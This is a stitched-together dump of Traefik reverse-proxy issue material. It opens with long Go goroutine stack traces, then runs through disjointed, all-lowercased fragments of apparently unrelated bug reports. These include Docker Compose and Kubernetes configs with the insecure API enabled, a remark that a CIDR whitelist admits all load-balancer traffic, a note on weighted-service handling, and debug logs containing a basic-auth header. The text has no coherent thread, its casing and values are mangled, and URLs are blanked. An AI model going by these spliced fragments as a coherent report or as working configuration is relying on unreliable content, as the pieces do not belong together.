github.com/containous/traefik/v2/pkg/middlewares/accesslog.addservicefields( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:47 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:36 +
github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , ) /go/pkg/mod/github.com/vulcand/oxy@v1.0.0/roundrobin/rr.go:147 +
github.com/containous/traefik/v2/pkg/middlewares/emptybackendhandler.(*emptybackend).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/emptybackendhandler/empty_backend_handler.go:31 +
github.com/containous/traefik/v2/pkg/middlewares/tracing.(*forwardermiddleware).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/tracing/forwarder.go:38 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:38 +
github.com/gorilla/mux.(*router).servehttp( , , , ) /go/pkg/mod/github.com/containous/mux@v0.0.0-20181024131434-c33f32e26898/mux.go:133 +
github.com/containous/traefik/v2/pkg/middlewares/recovery.(*recovery).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/recovery/recovery.go:33 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.addoriginfields( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:55 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:36 +
github.com/containous/traefik/v2/pkg/middlewares/requestdecorator.(*requestdecorator).servehttp( , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/requestdecorator/request_decorator.go:47 +
github.com/containous/traefik/v2/pkg/middlewares/requestdecorator.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/requestdecorator/request_decorator.go:84 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*handler).servehttp( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:202 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:69 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares.(*httphandlerswitcher).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/handler_switcher.go:23 +
github.com/containous/traefik/v2/pkg/middlewares/forwardedheaders.(*xforwarded).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/forwardedheaders/forwarded_header.go:174 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2802 +
net/http.initnpnrequest.servehttp( , , , , , , ) /usr/local/go/src/net/http/server.go:3365 +
net/http.(*http2serverconn).runhandler( , , , ) /usr/local/go/src/net/http/h2_bundle.go:5713 +
created by net/http.(*http2serverconn).processheaders /usr/local/go/src/net/http/h2_bundle.go:5447 + goroutine 658877 [chan receive]:
net/http.http2closewaiter.wait(...) /usr/local/go/src/net/http/h2_bundle.go:3314
net/http.(*http2responsewriter).closenotify.func1( , ) /usr/local/go/src/net/http/h2_bundle.go:6147 +
created by net/http.(*http2responsewriter).closenotify /usr/local/go/src/net/http/h2_bundle.go:6146 + goroutine 659726 [select]:
net/http.(*http2serverconn).writeheaders( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:5747 +
net/http.(*http2responsewriterstate).writechunk( , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:6050 +
net/http.(*http2responsewriter).flush( ) /usr/local/go/src/net/http/h2_bundle.go:6131 +
net/http.(*http2responsewriter).handlerdone( ) /usr/local/go/src/net/http/h2_bundle.go:6258 +
net/http.(*http2serverconn).runhandler.func1( , , ) /usr/local/go/src/net/http/h2_bundle.go:5711 +
net/http.(*http2serverconn).runhandler( , , , ) /usr/local/go/src/net/http/h2_bundle.go:5715 +
created by net/http.(*http2serverconn).processheaders /usr/local/go/src/net/http/h2_bundle.go:5447 + goroutine 659795 [chan receive]:
net/http.http2closewaiter.wait(...) /usr/local/go/src/net/http/h2_bundle.go:3314
net/http.(*http2responsewriter).closenotify.func1( , ) /usr/local/go/src/net/http/h2_bundle.go:6147 +
created by net/http.(*http2responsewriter).closenotify /usr/local/go/src/net/http/h2_bundle.go:6146 + goroutine 659820 [runnable]:
golang.org/x/net/http2.(*transport).getbodywriterstate.func1() /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:2482
created by golang.org/x/net/http2.bodywriterstate.schedulebodywrite /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:2533 + goroutine 659315 [select]:
net/http/httputil.(*reverseproxy).servehttp.func1( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:190 +
created by net/http/httputil.(*reverseproxy).servehttp /usr/local/go/src/net/http/httputil/reverseproxy.go:189 + goroutine 659811 [chan receive]:
net/http.http2closewaiter.wait(...) /usr/local/go/src/net/http/h2_bundle.go:3314
net/http.(*http2responsewriter).closenotify.func1( , ) /usr/local/go/src/net/http/h2_bundle.go:6147 +
created by net/http.(*http2responsewriter).closenotify /usr/local/go/src/net/http/h2_bundle.go:6146 + goroutine 659268 [select]:
golang.org/x/net/http2.(*clientconn).roundtrip( , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1084 +
golang.org/x/net/http2.(*transport).roundtripopt( , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:447 +
golang.org/x/net/http2.(*transport).roundtrip(...) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:408
github.com/containous/traefik/v2/pkg/server.(*h2ctransportwrapper).roundtrip( , , , , ) /go/src/github.com/containous/traefik/pkg/server/roundtripper.go:23 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:485 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/roundtrip.go:17 +
net/http/httputil.(*reverseproxy).servehttp( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:249 +
github.com/containous/traefik/v2/pkg/middlewares/pipelining.(*pipelining).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/pipelining/pipelining.go:34 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.addservicefields( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:47 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:36 +
github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , ) /go/pkg/mod/github.com/vulcand/oxy@v1.0.0/roundrobin/rr.go:147 +
github.com/containous/traefik/v2/pkg/middlewares/emptybackendhandler.(*emptybackend).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/emptybackendhandler/empty_backend_handler.go:31 +
github.com/containous/traefik/v2/pkg/middlewares/tracing.(*forwardermiddleware).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/tracing/forwarder.go:38 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:38 +
github.com/gorilla/mux.(*router).servehttp( , , , ) /go/pkg/mod/github.com/containous/mux@v0.0.0-20181024131434-c33f32e26898/mux.go:133 +
github.com/containous/traefik/v2/pkg/middlewares/recovery.(*recovery).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/recovery/recovery.go:33 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.addoriginfields( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:55 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:36 +
github.com/containous/traefik/v2/pkg/middlewares/requestdecorator.(*requestdecorator).servehttp( , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/requestdecorator/request_decorator.go:47 +
github.com/containous/traefik/v2/pkg/middlewares/requestdecorator.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/requestdecorator/request_decorator.go:84 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*handler).servehttp( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:202 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:69 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares.(*httphandlerswitcher).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/handler_switcher.go:23 +
github.com/containous/traefik/v2/pkg/middlewares/forwardedheaders.(*xforwarded).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/forwardedheaders/forwarded_header.go:174 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2802 +
net/http.initnpnrequest.servehttp( , , , , , , ) /usr/local/go/src/net/http/server.go:3365 +
net/http.(*http2serverconn).runhandler( , , , ) /usr/local/go/src/net/http/h2_bundle.go:5713 +
created by net/http.(*http2serverconn).processheaders /usr/local/go/src/net/http/h2_bundle.go:5447 + goroutine 658878 [select]:
net/http/httputil.(*reverseproxy).servehttp.func1( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:190 +
created by net/http/httputil.(*reverseproxy).servehttp /usr/local/go/src/net/http/httputil/reverseproxy.go:189 + goroutine 659779 [runnable]:
net/http.cloneurl(...) /usr/local/go/src/net/http/clone.go:26
net/http.(*request).withcontext(...) /usr/local/go/src/net/http/request.go:360
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*handler).servehttp( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:167 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:69 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares.(*httphandlerswitcher).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/handler_switcher.go:23 +
github.com/containous/traefik/v2/pkg/middlewares/forwardedheaders.(*xforwarded).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/forwardedheaders/forwarded_header.go:174 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2802 +
net/http.initnpnrequest.servehttp( , , , , , , ) /usr/local/go/src/net/http/server.go:3365 +
net/http.(*http2serverconn).runhandler( , , , ) /usr/local/go/src/net/http/h2_bundle.go:5713 +
created by net/http.(*http2serverconn).processheaders /usr/local/go/src/net/http/h2_bundle.go:5447 + goroutine 659799 [runnable]:
golang.org/x/net/http2.(*clientconn).roundtrip( , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1084 +
golang.org/x/net/http2.(*transport).roundtripopt( , , , , , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:447 +
golang.org/x/net/http2.(*transport).roundtrip(...) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:408
github.com/containous/traefik/v2/pkg/server.(*h2ctransportwrapper).roundtrip( , , , , ) /go/src/github.com/containous/traefik/pkg/server/roundtripper.go:23 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:485 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/roundtrip.go:17 +
net/http/httputil.(*reverseproxy).servehttp( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:249 +
github.com/containous/traefik/v2/pkg/middlewares/pipelining.(*pipelining).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/pipelining/pipelining.go:34 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.addservicefields( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:47 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:36 +
github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , ) /go/pkg/mod/github.com/vulcand/oxy@v1.0.0/roundrobin/rr.go:147 +
github.com/containous/traefik/v2/pkg/middlewares/emptybackendhandler.(*emptybackend).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/emptybackendhandler/empty_backend_handler.go:31 +
github.com/containous/traefik/v2/pkg/middlewares/tracing.(*forwardermiddleware).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/tracing/forwarder.go:38 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:38 +
github.com/gorilla/mux.(*router).servehttp( , , , ) /go/pkg/mod/github.com/containous/mux@v0.0.0-20181024131434-c33f32e26898/mux.go:133 +
github.com/containous/traefik/v2/pkg/middlewares/recovery.(*recovery).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/recovery/recovery.go:33 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.addoriginfields( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:55 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*fieldhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/field_middleware.go:36 +
github.com/containous/traefik/v2/pkg/middlewares/requestdecorator.(*requestdecorator).servehttp( , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/requestdecorator/request_decorator.go:47 +
github.com/containous/traefik/v2/pkg/middlewares/requestdecorator.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/requestdecorator/request_decorator.go:84 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*handler).servehttp( , , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:202 +
github.com/containous/traefik/v2/pkg/middlewares/accesslog.wraphandler.func1.1( , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:69 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2007 +
github.com/containous/traefik/v2/pkg/middlewares.(*httphandlerswitcher).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/handler_switcher.go:23 +
github.com/containous/traefik/v2/pkg/middlewares/forwardedheaders.(*xforwarded).servehttp( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/forwardedheaders/forwarded_header.go:174 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2802 +
net/http.initnpnrequest.servehttp( , , , , , , ) /usr/local/go/src/net/http/server.go:3365 +
net/http.(*http2serverconn).runhandler( , , , ) /usr/local/go/src/net/http/h2_bundle.go:5713 +
created by net/http.(*http2serverconn).processheaders /usr/local/go/src/net/http/h2_bundle.go:5447 + goroutine 659818 [chan receive]:
net/http.http2closewaiter.wait(...) /usr/local/go/src/net/http/h2_bundle.go:3314
net/http.(*http2responsewriter).closenotify.func1( , ) /usr/local/go/src/net/http/h2_bundle.go:6147 +
created by net/http.(*http2responsewriter).closenotify /usr/local/go/src/net/http/h2_bundle.go:6146 + goroutine 659314 [chan receive]:
net/http.http2closewaiter.wait(...) /usr/local/go/src/net/http/h2_bundle.go:3314
net/http.(*http2responsewriter).closenotify.func1( , ) /usr/local/go/src/net/http/h2_bundle.go:6147 +
created by net/http.(*http2responsewriter).closenotify /usr/local/go/src/net/http/h2_bundle.go:6146 + goroutine 659819 [runnable]:
net/http/httputil.(*reverseproxy).servehttp.func1( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:189
created by net/http/httputil.(*reverseproxy).servehttp /usr/local/go/src/net/http/httputil/reverseproxy.go:189 + goroutine 658768 [runnable]:
golang.org/x/net/http2.(*clientstream).awaitrequestcancel( , ) /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:312
created by golang.org/x/net/http2.(*clientconnreadloop).handleresponse /go/pkg/mod/golang.org/x/net@v0.0.0-20190930134127-c5a3c61f89f3/http2/transport.go:1929 + goroutine 659812 [select]:
net/http/httputil.(*reverseproxy).servehttp.func1( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:190 +
created by net/http/httputil.(*reverseproxy).servehttp /usr/local/go/src/net/http/httputil/reverseproxy.go:189 +
i run the source code on my windows 10.
```
aws with global accelerator linked to an _internal_ application load balancer forwarding to various traefik instances hosted by ecs
docker labels (cloudformation in use):
traefik.frontend.whitelist.usexforwardedfor: "true"
traefik.frontend.whitelist.sourcerange: !join [", ", [!ref sourceiprangesstaff, "172.20.0.0/16"]] # 172.20/16 is our cidr
``` by allowing our cidr, it allows all traffic passing through the alb in, too.
`docker-compose.yml`:
version: \'3\' services: reverse-proxy: image: traefik:v2.0.4 container_name: "traefik" restart: always command: #- "--log.level=debug" - "--api.insecure=true" - "--providers.docker=true" - "--providers.docker.exposedbydefault=false" - "--providers.file.filename=/etc/traefik/dynamic_conf.toml" - "--providers.file.watch=true" - "--entrypoints.web.address=:80" - "--entrypoints.websecure.address=:443" - "--certificatesresolvers.myhttpchallenge.acme.httpchallenge=true" - "--certificatesresolvers.myhttpchallenge.acme.httpchallenge.entrypoint=web" #- "--certificatesresolvers.myhttpchallenge.acme.caserver= " - "--certificatesresolvers.myhttpchallenge.acme.email=webmaster@example.com" - "--certificatesresolvers.myhttpchallenge.acme.storage=/letsencrypt/acme.json" ports: - "80:80" - "443:443" - "8080:8080" volumes: - ./letsencrypt:/letsencrypt - ./conf/dynamic_conf.toml:/etc/traefik/dynamic_conf.toml - /var/run/docker.sock:/var/run/docker.sock networks: - web ```` file provider for extra config:
[http.routers] [http.routers.test1] rule = "host(`example.com`)" entrypoints = [ "websecure" ] service = "test1-api" [http.routers.test1.tls] certresolver = "myhttpchallenge" [http.services] [http.services.test1-api] [[http.services.test1-api.weighted.services]] name = "test1-apiv1" weight = 1 [http.services.test1-apiv1] [http.services.test1-apiv1.loadbalancer] [[http.services.test1-apiv1.loadbalancer.servers]] url = "127.0.0.2"
pasted above (cli configuration)
```toml ```
log: level: debug
providers: file: filename: /etc/traefik/dynamic-conf.yml
entrypoints: web: address: ":80" transport: respondingtimeouts: readtimeout: "10s" writetimeout: "10s" idletimeout: 10 ```
metrics: prometheus: entrypoint: web addentrypointslabels: true addserviceslabels: true
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: annotations: kubernetes.io/ingress.class: traefik name: abc namespace: traefik
spec: entrypoints: - web routes: - kind: rule match: host(`abc.com`) services: - name: service-1 port: 9000 - name: service-2 port: 9000
### bug location #l78
as you can see, when you define one service, then balancerserverhttp will be used.
but when you define multiple services then `new dynamic.service` creates (in :93) without loadbalancer field (so `loadbalancer == nil`) i receive service like that in #l231
&dynamic.service{loadbalancer:(*dynamic.serversloadbalancer)(nil), weighted:(*dynamic.weightedroundrobin)( ), mirroring:(*dynamic.mirroring)(nil)}
but when i define one service, then receive like that:
&dynamic.service{loadbalancer:(*dynamic.serversloadbalancer)( ), weighted:(*dynamic.weightedroundrobin)(nil), mirroring:(*dynamic.mirroring)(nil)} ``` bug found but not sure how to fix it
version: '3.7'
services: traefik: image: traefik:latest ports: - 80:80 - 443:443 deploy: replicas: 1 placement: constraints: - node.role == manager labels: - traefik.enable=true - traefik.http.routers.traefik_http.rule=host(`127.0.0.11`) - traefik.http.routers.traefik_http.service=api@internal - traefik.http.routers.traefik_http.entrypoints=http volumes: - /var/run/docker.sock:/var/run/docker.sock command: > --providers.docker --providers.docker.exposedbydefault=false --providers.docker.swarmmode=true --entrypoints.http.address=":80" --entrypoints.https.address=":443" --accesslog --log.level=info --api=true --api.dashboard=true
```
``` env: - name: traefik_log value: "true" - name: traefik_log_level value: "debug" - name: traefik_accesslog value: "true" - name: traefik_accesslog_format value: "json" - name: traefik_api value: "true" - name: traefik_api_insecure value: "true" - name: traefik_entrypoints_web value: "true" - name: traefik_entrypoints_web_address value: ":80" - name: traefik_entrypoints_webs value: "true" - name: traefik_entrypoints_webs_address value: ":443" - name: traefik_metrics_prometheus value: "true" - name: traefik_providers_kubernetescrd value: "true" - name: traefik_providers_kubernetescrd_ingressclass value: "traefik-uga" - name: traefik_providers_kubernetesingress value: "true" - name: traefik_providers_kubernetesingress_ingressclass value: "traefik-uga"
``` <details>
<summary> logs </summary> ```
time="2019-10-21t09:07:02z" level=debug msg="adding certificate for domain(s) *.blabla.fr,blabla.fr"
time="2019-10-21t09:07:02z" level=debug msg="no default certificate, generating one"
time="2019-10-21t09:07:03z" level=debug msg="skipping kubernetes event kind *v1.endpoints" providername=kubernetes
time="2019-10-21t09:07:03z" level=debug msg="configuration received from provider kubernetescrd: {\\"http\\":{\\"routers\\":{\\"traefik-traefik-ui-52b87130052d50bba54a\\":{\\"entrypoints\\":[\\"web\\",\\"webs\\"],\\"middlewares\\":[\\"traefik-blabla-dc-auth\\"],\\"service\\":\\"traefik-traefik-ui-52b87130052d50bba54a\\",\\"rule\\":\\"host(`traefik-test-infra.blabla.fr`)\\",\\"tls\\":{}},\\"traefik-traefik-ui-http-52b87130052d50bba54a\\":{\\"entrypoints\\":[\\"web\\"],\\"middlewares\\":[\\"traefik-redirect-https\\"],\\"service\\":\\"traefik-traefik-ui-http-52b87130052d50bba54a\\",\\"rule\\":\\"host(`traefik-test-infra.blabla.fr`)\\"}},\\"middlewares\\":{\\"traefik-blabla-dc-auth\\":{\\"forwardauth\\":{\\"address\\":\\" ",\\"tls\\":{\\"insecureskipverify\\":true},\\"trustforwardheader\\":true,\\"authresponseheaders\\":[\\"x-auth-user\\",\\"x-secret\\"]}},\\"traefik-redirect-https\\":{\\"redirectscheme\\":{\\"scheme\\":\\"https\\"}}},\\"services\\":{\\"traefik-traefik-ui-52b87130052d50bba54a\\":{\\"loadbalancer\\":{\\"servers\\":[{\\"url\\":\\" "},{\\"url\\":\\" "}],\\"passhostheader\\":true}},\\"traefik-traefik-ui-http-52b87130052d50bba54a\\":{\\"loadbalancer\\":{\\"servers\\":[{\\"url\\":\\" "},{\\"url\\":\\" "}],\\"passhostheader\\":true}}}},\\"tcp\\":{},\\"tls\\":{}}" providername=kubernetescrd
time="2019-10-21t09:07:03z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/overview\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"application/json, text/plain, */*\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"fr,en-us;q=0.7,en;q=0.3\\"],\\"authorization\\":[\\"basic y2fpbgxldhi6ckfnzte1bufjaa==\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64; rv:69.0) gecko/20100101 firefox/69.0\\"],\\"x-forwarded-host\\":[\\"traefik-test-infra.blabla.fr\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-5c85c4c558-64lhf\\"],\\"x-real-ip\\":[\\"x.x.x.x\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"traefik-test-infra.blabla.fr\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"x.x.x.x:60332\\",\\"requesturi\\":\\"/api/overview\\",\\"tls\\":null}"
time="2019-10-21t09:07:03z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/overview\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"application/json, text/plain, */*\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"fr,en-us;q=0.7,en;q=0.3\\"],\\"authorization\\":[\\"basic y2fpbgxldhi6ckfnzte1bufjaa==\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64; rv:69.0) gecko/20100101 firefox/69.0\\"],\\"x-forwarded-host\\":[\\"traefik-test-infra.blabla.fr\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-5c85c4c558-64lhf\\"],\\"x-real-ip\\":[\\"x.x.x.x\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"traefik-test-infra.blabla.fr\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"x.x.x.x:60332\\",\\"requesturi\\":\\"/api/overview\\",\\"tls\\":null}" forwardurl=" "
time="2019-10-21t09:07:03z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/overview\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"application/json, text/plain, */*\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"fr,en-us;q=0.7,en;q=0.3\\"],\\"authorization\\":[\\"basic y2fpbgxldhi6ckfnzte1bufjaa==\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64; rv:69.0) gecko/20100101 firefox/69.0\\"],\\"x-forwarded-host\\":[\\"traefik-test-infra.blabla.fr\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-5c85c4c558-64lhf\\"],\\"x-real-ip\\":[\\"x.x.x.x\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"traefik-test-infra.blabla.fr\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"x.x.x.x:60332\\",\\"requesturi\\":\\"/api/overview\\",\\"tls\\":null}"
{"clientaddr":"x.x.x.x:60332","clienthost":"x.x.x.x","clientport":"60332","clientusername":"-","downstreamcontentsize":371,"downstreamstatus":200,"duration":40755671,"origincontentsize":371,"originduration":40573097,"originstatus":200,"overhead":182574,"requestaddr":"traefik-test-infra.bl.fr","requestcontentsize":0,"requestcount":2,"requesthost":"traefik-test-infra.blabla.fr","requestmethod":"get","requestpath":"/api/overview","requestport":"-","requestprotocol":"http/2.0","retryattempts":0,"routername":"traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd","serviceaddr":"10.42.0.72:8080","servicename":"traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd","serviceurl":{"scheme":"http","opaque":"","user":null,"host":"10.42.0.72:8080","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"startlocal":"2019-10-21t09:07:03.270316056z","startutc":"2019-10-21t09:07:03.270316056z","entrypointname":"webs","level":"info","msg":"","time":"2019-10-21t09:07:03z"}
